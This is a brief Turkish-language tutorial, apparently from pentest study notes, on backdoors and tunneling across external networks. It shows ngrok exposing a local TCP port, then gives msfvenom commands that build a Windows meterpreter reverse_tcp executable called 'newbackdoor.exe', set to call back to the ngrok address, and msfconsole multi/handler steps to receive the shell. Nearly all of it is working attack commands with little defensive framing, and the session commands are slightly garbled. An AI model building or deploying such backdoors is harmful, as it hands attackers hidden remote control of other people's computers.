# Dış Ağlarda Backdoor ve Tunneling

## Tunneling Service

- Tunneling service, normalde dışarıdan erişilemeyen yerel bir servis ile internet arasında tünel oluşturan hizmettir.

- localhost:5000 → internet → public adres

- > ./ngrok tcp 4242 // Bilgisayarındaki 4242 numaralı TCP portunu ngrok üzerinden internete açan bir TCP tüneli oluşturduk.

\*\* tcp://0.tcp.ngrok.io:11620 -> localhost:4242

## msfvenom

- > msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=11620 -f exe -o /root/newbackdoor.exe // lhost=0.tcp.ngrok.io lport=11620 ngroktan alındı. // Kendi public ip de kullanılabilirdi

- > msfconsole
- > use exploit/multi/handler
- > msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp // Oluşturulan backdoor bilgileri
- > msf6 exploit(multi/handler) > show options
- > msf6 exploit(multi/handler) > set LHOST 0.0.0.0
- > msf6 exploit(multi/handler) > set LPORT 4242
- > msf6 exploit(multi/handler) > exploit -j -z
- > msf6 exploit(multi/handler) > session -l
- > msf6 exploit(multi/handler) > session -1
